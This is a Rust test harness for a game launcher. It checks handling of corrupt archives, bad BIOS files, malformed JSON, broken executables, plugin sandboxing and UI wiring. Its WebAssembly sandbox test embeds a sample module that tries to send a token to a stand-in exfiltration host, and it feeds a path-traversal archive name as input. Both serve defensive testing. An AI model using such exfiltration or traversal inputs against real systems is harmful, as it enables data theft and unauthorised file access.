use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ChaosCaseResult {
    pub name: String,
    pub passed: bool,
    pub elapsed_ms: u64,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressHarnessReport {
    pub version: String,
    pub total_cases: usize,
    pub passed_cases: usize,
    pub failed_cases: usize,
    pub elapsed_ms: u64,
    pub cases: Vec<ChaosCaseResult>,
}

fn unique_stress_dir(tag: &str) -> Result<PathBuf, String> {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let dir = std::env::temp_dir().join(format!(
        "duke_chaos_{}_{}_{}",
        tag,
        std::process::id(),
        nonce
    ));
    fs::create_dir_all(&dir)
        .map_err(|e| format!("Failed creating chaos temp dir {}: {e}", dir.display()))?;
    Ok(dir)
}

fn run_case<F>(name: &str, f: F) -> ChaosCaseResult
where
    F: FnOnce() -> Result<String, String>,
{
    let started = Instant::now();
    match f() {
        Ok(detail) => ChaosCaseResult {
            name: name.to_string(),
            passed: true,
            elapsed_ms: started.elapsed().as_millis() as u64,
            detail,
        },
        Err(detail) => ChaosCaseResult {
            name: name.to_string(),
            passed: false,
            elapsed_ms: started.elapsed().as_millis() as u64,
            detail,
        },
    }
}

fn case_corrupt_zip_recovery(root: &Path) -> Result<String, String> {
    let corrupt_zip = root.join("corrupt_payload.zip");
    let dst = root.join("zip_out");
    let mut garbage = b"PK\x03\x04\x14\x00\x00\x00\x08\x00".to_vec();
    garbage.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0xFF, 0x7A, 0x3C]);
    fs::write(&corrupt_zip, &garbage).map_err(|e| e.to_string())?;

    if crate::extract_archive_to_folder_sync(&corrupt_zip, &dst).is_ok() {
        return Err("Corrupt ZIP unexpectedly reported Ok".to_string());
    }

    let traversal_path = Path::new("..\\..\\outside_evil.zip");
    if crate::extract_archive_to_folder_sync(traversal_path, &dst).is_ok() {
        return Err("Path traversal archive check unexpectedly passed".to_string());
    }

    Ok("Corrupt ZIP & traversal path rejected cleanly with zero panic.".to_string())
}

fn case_multidisc_cue_bin_grouping(root: &Path) -> Result<String, String> {
    let disc_dir = root.join("roms_ps1");
    fs::create_dir_all(&disc_dir).map_err(|e| e.to_string())?;

    for disc in 1..=2 {
        let cue = disc_dir.join(format!("Chrono Chaos (Disc {}).cue", disc));
        let bin = disc_dir.join(format!("Chrono Chaos (Disc {}).bin", disc));
        fs::write(
            &cue,
            format!("FILE \"Chrono Chaos (Disc {}).bin\" BINARY\n  TRACK 01 MODE2/2352\n", disc),
        )
        .map_err(|e| e.to_string())?;
        fs::write(&bin, vec![disc as u8; 1024]).map_err(|e| e.to_string())?;
    }

    let groups = crate::rom_patcher::generate_m3u_playlists_in_dir(&disc_dir)?;
    if groups.len() != 1 {
        return Err(format!("Expected 1 M3U group, got {}", groups.len()));
    }
    let m3u_text = fs::read_to_string(&groups[0].m3u_path).map_err(|e| e.to_string())?;
    if !m3u_text.contains("(Disc 1).cue") || !m3u_text.contains("(Disc 2).cue") {
        return Err(format!("Generated M3U missing discs: {}", m3u_text));
    }

    Ok(format!(
        "Grouped 2-disc .cue/.bin set into {} cleanly.",
        groups[0].m3u_path
    ))
}

fn case_bios_hash_mismatch_and_missing(root: &Path) -> Result<String, String> {
    let emu_root = root.join("emulators");
    let cas_root = root.join("cas_bios");
    let q_root = root.join("quarantine_bios");
    let src_dir = root.join("bios_drops");
    fs::create_dir_all(&src_dir).map_err(|e| e.to_string())?;

    // Valid name scph5501.bin with invalid hash bytes must be quarantined rather than installed!
    let bad_bios = src_dir.join("scph5501.bin");
    fs::write(&bad_bios, vec![0xA5u8; 4096]).map_err(|e| e.to_string())?;

    let report = crate::bios_vault::scan_and_install_bios_in_roots(
        &[src_dir],
        &emu_root,
        &cas_root,
        &q_root,
        None,
    )?;
    if report.quarantined_count == 0 {
        return Err("Wrong-hash scph5501.bin was not quarantined.".to_string());
    }
    if report.missing_required_count == 0 {
        return Err("Missing required BIOS report unexpectedly showed 0 missing.".to_string());
    }
    Ok(format!(
        "Quarantined {} mismatched BIOS file(s); missingRequired={}.",
        report.quarantined_count, report.missing_required_count
    ))
}

fn case_disabled_projfs_and_platform_fallback() -> Result<String, String> {
    let projfs = crate::projfs_stream::probe_projfs_status();
    if projfs.message.trim().is_empty() {
        return Err("ProjFS runtime status returned empty message.".to_string());
    }
    let ds = crate::direct_storage::probe_direct_storage_runtime(None);
    if ds.active_backend.trim().is_empty() {
        return Err("DirectStorage probe returned empty backend label.".to_string());
    }
    let snap = duke_core::platform_backend::current_platform_snapshot();
    if snap.arch.trim().is_empty() || snap.isolation.backend_name.trim().is_empty() {
        return Err("PlatformBackend returned incomplete probe metadata.".to_string());
    }
    Ok(format!(
        "ProjFS='{}', DS='{}', Platform='{}/{}'.",
        if projfs.api_bound { "Bound" } else { "SafeFallback" },
        ds.active_backend,
        snap.os_label,
        snap.arch
    ))
}

fn case_malformed_json_and_catalog_recovery(root: &Path) -> Result<String, String> {
    let lib_path = root.join("library.json");
    let bak_path = root.join("library.json.bak");
    fs::write(&bak_path, "[{\"id\":\"ok_game\",\"title\":\"Safe Backup\"}]")
        .map_err(|e| e.to_string())?;
    fs::write(&lib_path, "{corrupt_truncated: [").map_err(|e| e.to_string())?;

    let recovered = crate::self_heal::recover_protected_json_if_corrupt(&lib_path)?;
    if !recovered {
        return Err("recover_protected_json_if_corrupt returned false on corrupt primary JSON.".to_string());
    }
    let restored_raw = crate::self_heal::read_json_with_bak_recovery(&lib_path)?;
    if !restored_raw.contains("Safe Backup") {
        return Err("Recovered JSON missing expected .bak payload.".to_string());
    }

    let (settings, _changed) = crate::normalize_loaded_settings("{broken_settings_json!!!");
    if settings.theme.trim().is_empty() || settings.card_zoom_px < 125 {
        return Err("Malformed settings.json failed to fall back cleanly.".to_string());
    }
    let (migrated_settings, migrated) =
        crate::normalize_loaded_settings(r#"{"theme":"invalid_chaos_theme","cardZoomPx":999}"#);
    if !migrated || migrated_settings.theme != "dark" || migrated_settings.card_zoom_px != 280 {
        return Err("Invalid settings fields failed to migrate and clamp cleanly.".to_string());
    }

    if crate::sources::parse_hydra_manifest_str("{not valid json", "chaos").is_ok() {
        return Err("Malformed Hydra source JSON unexpectedly parsed Ok.".to_string());
    }

    fs::write(root.join("catalog.dkcat"), b"BADCAT00").map_err(|e| e.to_string())?;
    if crate::self_heal::verify_catalog_integrity(root) {
        return Err("Corrupt catalog.dkcat unexpectedly verified true.".to_string());
    }

    Ok("Corrupt library.json restored via .bak; malformed settings/Hydra/catalog recovered cleanly.".to_string())
}

fn case_0xc000007b_crash_diagnosis_and_pe(root: &Path) -> Result<String, String> {
    let diag = crate::fix_finder::diagnose_crash_code(
        "chaos_07b",
        "Chaos Engine Game",
        "missing_game.exe",
        None,
        0xC000_007Bu32 as i32,
        412,
    )
    .ok_or_else(|| "0xC000007B failed to generate CrashDiagnosisReport.".to_string())?;
    if !diag.exit_code_hex.contains("0xC000007B") {
        return Err(format!("Unexpected hex code '{}'", diag.exit_code_hex));
    }
    let recommends_dlls = diag
        .recommended_actions
        .iter()
        .any(|a| a.id == "heal_runtime_dlls" && a.recommended);
    if !recommends_dlls {
        return Err("0xC000007B did not recommend heal_runtime_dlls.".to_string());
    }

    let bad_exe = root.join("broken_header.exe");
    fs::write(&bad_exe, b"MZ\x90\x00\x03\x00BADPE").map_err(|e| e.to_string())?;
    let bytes = fs::read(&bad_exe).map_err(|e| e.to_string())?;
    if crate::pe_inspect::parse_pe_header_and_imports(&bytes).is_ok() {
        return Err("Truncated PE header unexpectedly parsed Ok.".to_string());
    }
    Ok("0xC000007B diagnosed with DLL/DXVK remediation; truncated PE safely rejected.".to_string())
}

fn case_bler_texture_conditioning_and_corruption(root: &Path) -> Result<String, String> {
    let blocks = 1024usize;
    let mut dds = vec![0u8; 128 + blocks * 8];
    dds[0..4].copy_from_slice(b"DDS ");
    dds[4..8].copy_from_slice(&124u32.to_le_bytes());
    dds[12..16].copy_from_slice(&128u32.to_le_bytes());
    dds[16..20].copy_from_slice(&128u32.to_le_bytes());
    dds[76..80].copy_from_slice(&32u32.to_le_bytes());
    dds[84..88].copy_from_slice(b"DXT1");
    for i in 0..blocks {
        let base = 128 + i * 8;
        let c = (i as u16).wrapping_mul(5);
        dds[base..base + 2].copy_from_slice(&c.to_le_bytes());
        dds[base + 2..base + 4].copy_from_slice(&c.wrapping_add(0x0420).to_le_bytes());
        dds[base + 4..base + 8].copy_from_slice(&((i as u32).wrapping_mul(0x5555_1234)).to_le_bytes());
    }
    let dds_path = root.join("chaos_tex.dds");
    let dkds_path = root.join("chaos_tex.dds.dkds");
    fs::write(&dds_path, &dds).map_err(|e| e.to_string())?;
    let stats = crate::direct_storage::encode_dkds_stream_with_bler(&dds_path, &dkds_path, 3)?;
    if stats.bler_conditioned_chunks == 0 {
        return Err("BLER conditioning was not applied to BC1 DDS payload.".to_string());
    }
    crate::direct_storage::verify_dkds_stream(&dkds_path, Some(&stats.source_blake3))?;

    let mut raw = fs::read(&dkds_path).map_err(|e| e.to_string())?;
    if let Some(last) = raw.last_mut() {
        *last ^= 0xFF;
    }
    fs::write(&dkds_path, &raw).map_err(|e| e.to_string())?;
    if crate::direct_storage::verify_dkds_stream(&dkds_path, Some(&stats.source_blake3)).is_ok() {
        return Err("Corrupted BLER DKDS stream bypassed verification.".to_string());
    }
    Ok(format!(
        "BLER BC1 stream encoded ({} conditioned chunk(s), {} B extra saved) & tamper caught.",
        stats.bler_conditioned_chunks, stats.bler_extra_saved_bytes
    ))
}

fn case_wasm_sandbox_and_fse_safety() -> Result<String, String> {
    let malicious_wat = br#"(module
  (import "duke" "http_get_scoped" (func $http (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 0) "https://exfil.unapproved.invalid/token")
  (func (export "duke_run_hook") (result i32)
    (call $http (i32.const 0) (i32.const 38) (i32.const 256) (i32.const 256))
  )
)"#;
    let res = crate::wasm_plugins::execute_wasm_module_bytes(
        "chaos_wasm",
        malicious_wat,
        crate::wasm_plugins::PluginCapabilityGrant::default(),
        "metadata_lookup",
        "",
        &[],
        Some(Arc::new(|_| Ok("should_never_fetch".to_string()))),
    )?;
    if res.exit_code != -1 || res.capability_denials.is_empty() {
        return Err("Wasmtime sandbox failed to block unapproved HTTP exfil attempt.".to_string());
    }
    if crate::fse_shell::is_safe_to_suspend_bloat_exe("explorer.exe")
        || crate::fse_shell::is_safe_to_suspend_bloat_exe("csrss.exe")
    {
        return Err("FSE bloat safety guard allowed suspending protected Windows process.".to_string());
    }
    if crate::duke_link::DukeLinkPacket::decode(b"corrupt_pkt").is_ok() {
        return Err("DukeLinkPacket decoded invalid garbage payload.".to_string());
    }
    Ok("Wasmtime denied unauthorized domain, FSE protected core Windows processes, QUIC decoder rejected garbage.".to_string())
}

fn extract_quoted_args(haystack: &str, fn_prefix: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = haystack;
    while let Some(pos) = rest.find(fn_prefix) {
        let after = &rest[pos + fn_prefix.len()..];
        let trimmed = after.trim_start();
        if let Some(quote) = trimmed.chars().next() {
            if quote == '"' || quote == '\'' {
                let inner = &trimmed[1..];
                if let Some(end_q) = inner.find(quote) {
                    out.push(inner[..end_q].to_string());
                    rest = &inner[end_q + 1..];
                    continue;
                }
            }
        }
        rest = after;
    }
    out
}

fn resolve_workspace_launcher_dirs() -> Option<(PathBuf, PathBuf)> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    if manifest_dir.join("src").join("main.rs").is_file() {
        if let Some(parent) = manifest_dir.parent() {
            if parent.join("src").join("index.html").is_file() {
                return Some((parent.to_path_buf(), manifest_dir));
            }
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        let dl = if cwd.join("duke-launcher").join("src").join("index.html").is_file() {
            cwd.join("duke-launcher")
        } else if cwd.join("src").join("index.html").is_file() {
            cwd
        } else {
            return None;
        };
        let tauri = dl.join("src-tauri");
        if tauri.join("src").join("main.rs").is_file() {
            return Some((dl, tauri));
        }
    }
    None
}

fn case_controller_disconnect_and_mode_exit_state_hygiene() -> Result<String, String> {
    let mut dirty = crate::couch_mode::UniversalPadState {
        connected: true,
        slot: 2,
        lx: 0.78,
        ly: -0.64,
        rx: -0.45,
        ry: 0.35,
        lt: 0.92,
        rt: 0.88,
        a: true,
        b: true,
        x: true,
        y: true,
        lb: true,
        rb: true,
        back: true,
        start: true,
        ls: true,
        rs: true,
        up: true,
        down: true,
        left: true,
        right: true,
        guide: true,
        buttons_mask: 0xFFFF,
        controller_kind: "xbox".to_string(),
        device_name: "Mock Pad".to_string(),
        vid_pid: "045e:02ea".to_string(),
        raw_axes: [0.5, -0.5, 0.25, -0.25],
        calibrated_axes: [0.4, -0.4, 0.2, -0.2],
        ..Default::default()
    };
    dirty.zero_inputs();

    if dirty.connected
        || dirty.slot != 0
        || dirty.lx != 0.0
        || dirty.ly != 0.0
        || dirty.rx != 0.0
        || dirty.ry != 0.0
        || dirty.lt != 0.0
        || dirty.rt != 0.0
        || dirty.buttons_mask != 0
        || dirty.a
        || dirty.b
        || dirty.x
        || dirty.y
        || dirty.lb
        || dirty.rb
        || dirty.back
        || dirty.start
        || dirty.ls
        || dirty.rs
        || dirty.up
        || dirty.down
        || dirty.left
        || dirty.right
        || dirty.guide
        || dirty.controller_kind != "none"
        || dirty.device_name != "None"
        || !dirty.vid_pid.is_empty()
    {
        return Err("UniversalPadState::zero_inputs left non-zero controller state.".to_string());
    }

    let snap = crate::couch_mode::UniversalPadState::disconnected_snapshot(0.14, true);
    if snap.connected
        || snap.buttons_mask != 0
        || snap.lx != 0.0
        || snap.ly != 0.0
        || snap.controller_kind != "none"
    {
        return Err("UniversalPadState::disconnected_snapshot did not return zeroed state.".to_string());
    }

    for _ in 0..25 {
        crate::couch_mode::clear_transient_couch_state();
        let status = crate::couch_mode::current_couch_status(false);
        if status.radial_visible
            || status.virtual_keyboard_visible
            || status.radial_selected_slot.is_some()
        {
            return Err("Transient Duke Deck state leaked after clear_transient_couch_state().".to_string());
        }
    }

    Ok("Controller disconnect zero-inputs, disconnected snapshot, and 25x Duke Deck transient state resets verified.".to_string())
}

pub fn verify_frontend_views_themes_and_ipc() -> Result<String, String> {
    let Some((launcher_dir, tauri_dir)) = resolve_workspace_launcher_dirs() else {
        return Ok("Source tree not adjacent to binary; skipped static UI parity scan.".to_string());
    };
    let index_html = fs::read_to_string(launcher_dir.join("src").join("index.html"))
        .map_err(|e| format!("Failed reading index.html: {e}"))?;
    let styles_css = fs::read_to_string(launcher_dir.join("src").join("styles.css"))
        .map_err(|e| format!("Failed reading styles.css: {e}"))?;
    let api_js = fs::read_to_string(launcher_dir.join("src").join("api.js"))
        .map_err(|e| format!("Failed reading api.js: {e}"))?;
    let main_js = fs::read_to_string(launcher_dir.join("src").join("main.js"))
        .map_err(|e| format!("Failed reading main.js: {e}"))?;
    let main_rs = fs::read_to_string(tauri_dir.join("src").join("main.rs"))
        .map_err(|e| format!("Failed reading main.rs: {e}"))?;
    let tauri_conf = fs::read_to_string(tauri_dir.join("tauri.conf.json"))
        .map_err(|e| format!("Failed reading tauri.conf.json: {e}"))?;

    // 1. Version & Window Safety Checks
    if !index_html.contains("2.1.1") || !tauri_conf.contains("\"2.1.1\"") {
        return Err("Expected v2.1.1 marker missing in index.html or tauri.conf.json.".to_string());
    }

    let default_sites = crate::sites::default_search_sites();
    if default_sites.len() != 8
        || default_sites
            .iter()
            .any(|s| s.home_url.to_ascii_lowercase().contains("vimm") || s.name.to_ascii_lowercase().contains("vimm"))
    {
        return Err("Default search sites failed legal 8-directory compliance check.".to_string());
    }
    let conf_json: serde_json::Value =
        serde_json::from_str(&tauri_conf).map_err(|e| format!("Invalid tauri.conf.json: {e}"))?;
    let main_win_transparent = conf_json["app"]["windows"]
        .as_array()
        .and_then(|arr| arr.iter().find(|w| w["label"] == "main"))
        .and_then(|w| w["transparent"].as_bool())
        .unwrap_or(true);
    if main_win_transparent {
        return Err("Main window in tauri.conf.json must keep \"transparent\": false.".to_string());
    }

    // 2. Views, Modals, and All 10 Solid Themes
    for view_id in [
        "library-view",
        "game-detail-view",
        "catalog-view",
        "downloader-view",
        "sources-view",
        "settings-view",
    ] {
        if !index_html.contains(&format!("id=\"{view_id}\"")) {
            return Err(format!("Missing view section #{view_id} in index.html"));
        }
    }
    for modal_id in [
        "details-modal",
        "restore-save-modal",
        "catalog-detail-modal",
        "add-site-modal",
        "bulk-import-modal",
        "snapshots-modal",
        "preflight-modal",
        "emu-install-prompt-modal",
        "clean-uninstall-modal",
        "coop-stream-modal",
    ] {
        if !index_html.contains(&format!("id=\"{modal_id}\"")) {
            return Err(format!("Missing modal #{modal_id} in index.html"));
        }
    }
    for theme in [
        "dark", "light", "minecraft", "sunset", "aerospace", "cyberpunk", "terminal", "crimson",
        "ocean", "frost",
    ] {
        if !styles_css.contains(&format!("body[data-theme=\"{theme}\"]")) {
            return Err(format!("Missing CSS theme definition [data-theme=\"{theme}\"]"));
        }
    }

    // 3. Inline SVG Sprite Integrity
    let mut symbol_ids = HashSet::new();
    let mut rest = index_html.as_str();
    while let Some(pos) = rest.find("<symbol id=\"") {
        let after = &rest[pos + 12..];
        if let Some(end) = after.find('"') {
            symbol_ids.insert(after[..end].to_string());
            rest = &after[end + 1..];
        } else {
            break;
        }
    }
    for source in [&index_html, &main_js] {
        let mut cursor = source.as_str();
        while let Some(pos) = cursor.find("href=\"#icon-") {
            let after = &cursor[pos + 7..];
            if let Some(end) = after.find('"') {
                let sym = &after[..end];
                if !symbol_ids.contains(sym) {
                    return Err(format!("SVG <use href=\"#{sym}\"> has no matching <symbol> in index.html"));
                }
                cursor = &after[end + 1..];
            } else {
                break;
            }
        }
    }

    // 4. DOM ID Parity (el("...") in main.js vs id="..." in index.html)
    let mut html_ids = HashSet::new();
    let mut id_cursor = index_html.as_str();
    while let Some(pos) = id_cursor.find("id=\"") {
        let after = &id_cursor[pos + 4..];
        if let Some(end) = after.find('"') {
            html_ids.insert(after[..end].to_string());
            id_cursor = &after[end + 1..];
        } else {
            break;
        }
    }
    for js_id in extract_quoted_args(&main_js, "el(") {
        if !html_ids.contains(&js_id) {
            return Err(format!("main.js calls el(\"{js_id}\") but id=\"{js_id}\" is missing from index.html"));
        }
    }

    // 5. Tauri IPC Parity (invokeCommand("...") in api.js vs generate_handler![] in main.rs)
    let handler_start = main_rs
        .find("tauri::generate_handler![")
        .ok_or_else(|| "Missing tauri::generate_handler! in main.rs".to_string())?;
    let handler_block = &main_rs[handler_start..];
    let handler_end = handler_block
        .find("])")
        .ok_or_else(|| "Unterminated tauri::generate_handler! block".to_string())?;
    let registered_slice = &handler_block[..handler_end];
    let invoke_cmds = extract_quoted_args(&api_js, "invokeCommand(");
    if invoke_cmds.is_empty() {
        return Err("No invokeCommand() calls found in api.js".to_string());
    }
    for cmd in &invoke_cmds {
        if !registered_slice.contains(cmd) {
            return Err(format!("api.js calls invokeCommand(\"{cmd}\") not registered in generate_handler![]"));
        }
    }

    for required_hook in [
        "clearControllerFocus",
        "gamepaddisconnected",
        "toggleCouchMode",
        "closeTopmostUiLayer",
    ] {
        if !main_js.contains(required_hook) {
            return Err(format!(
                "main.js missing required controller/state hygiene symbol `{required_hook}`"
            ));
        }
    }

    Ok(format!(
        "Verified 6 views, 10 modals, 10 themes, {} SVG symbols, {} DOM IDs checked, {} IPC commands registered.",
        symbol_ids.len(),
        html_ids.len(),
        invoke_cmds.len()
    ))
}

/// Runs the full deterministic chaos & integration stress harness cleanly inside isolated temp folders.
pub fn run_chaos_stress_harness_sync(check_ui_contract: bool) -> StressHarnessReport {
    let started = Instant::now();
    let temp_root = match unique_stress_dir("suite") {
        Ok(d) => d,
        Err(err) => {
            return StressHarnessReport {
                version: env!("CARGO_PKG_VERSION").to_string(),
                total_cases: 1,
                passed_cases: 0,
                failed_cases: 1,
                elapsed_ms: 0,
                cases: vec![ChaosCaseResult {
                    name: "create_temp_workspace".to_string(),
                    passed: false,
                    elapsed_ms: 0,
                    detail: err,
                }],
            };
        }
    };

    let mut cases = vec![
        run_case("corrupt_zip_archive_recovery", || {
            case_corrupt_zip_recovery(&temp_root)
        }),
        run_case("multidisc_cue_bin_grouping", || {
            case_multidisc_cue_bin_grouping(&temp_root)
        }),
        run_case("bios_hash_mismatch_and_missing", || {
            case_bios_hash_mismatch_and_missing(&temp_root)
        }),
        run_case(
            "disabled_projfs_and_platform_fallback",
            case_disabled_projfs_and_platform_fallback,
        ),
        run_case("malformed_json_bak_and_catalog_recovery", || {
            case_malformed_json_and_catalog_recovery(&temp_root)
        }),
        run_case("crash_0xc000007b_and_malformed_pe", || {
            case_0xc000007b_crash_diagnosis_and_pe(&temp_root)
        }),
        run_case("direct_storage_bler_bc1_corrupt_rejection", || {
            case_bler_texture_conditioning_and_corruption(&temp_root)
        }),
        run_case(
            "wasm_sandbox_and_fse_safety_guard",
            case_wasm_sandbox_and_fse_safety,
        ),
        run_case(
            "controller_disconnect_and_mode_exit_state_hygiene",
            case_controller_disconnect_and_mode_exit_state_hygiene,
        ),
    ];

    if check_ui_contract {
        cases.push(run_case(
            "frontend_views_modals_10themes_svg_ipc_parity",
            verify_frontend_views_themes_and_ipc,
        ));
    }

    let _ = fs::remove_dir_all(&temp_root);

    let total_cases = cases.len();
    let passed_cases = cases.iter().filter(|c| c.passed).count();
    let failed_cases = total_cases.saturating_sub(passed_cases);

    StressHarnessReport {
        version: env!("CARGO_PKG_VERSION").to_string(),
        total_cases,
        passed_cases,
        failed_cases,
        elapsed_ms: started.elapsed().as_millis() as u64,
        cases,
    }
}

pub fn run_cli_stress_test() -> Result<(), String> {
    let report = run_chaos_stress_harness_sync(true);
    println!(
        "=== Duke Launcher v{} Chaos & Integration Stress Harness ({}/{} passed in {} ms) ===",
        report.version, report.passed_cases, report.total_cases, report.elapsed_ms
    );
    for c in &report.cases {
        println!(
            "[{}] {} ({} ms) - {}",
            if c.passed { "PASS" } else { "FAIL" },
            c.name,
            c.elapsed_ms,
            c.detail
        );
    }
    if report.failed_cases > 0 {
        Err(format!(
            "{} chaos stress case(s) failed.",
            report.failed_cases
        ))
    } else {
        Ok(())
    }
}

#[tauri::command]
pub async fn run_chaos_stress_harness() -> Result<StressHarnessReport, String> {
    tokio::task::spawn_blocking(|| run_chaos_stress_harness_sync(true))
        .await
        .map_err(|e| format!("Stress harness task failed: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chaos_stress_harness_passes_all_cases_zero_panics() {
        let report = run_chaos_stress_harness_sync(true);
        for case in &report.cases {
            assert!(
                case.passed,
                "Chaos stress case '{}' failed: {}",
                case.name, case.detail
            );
        }
        assert_eq!(report.failed_cases, 0);
        assert_eq!(report.passed_cases, 10);
    }
}
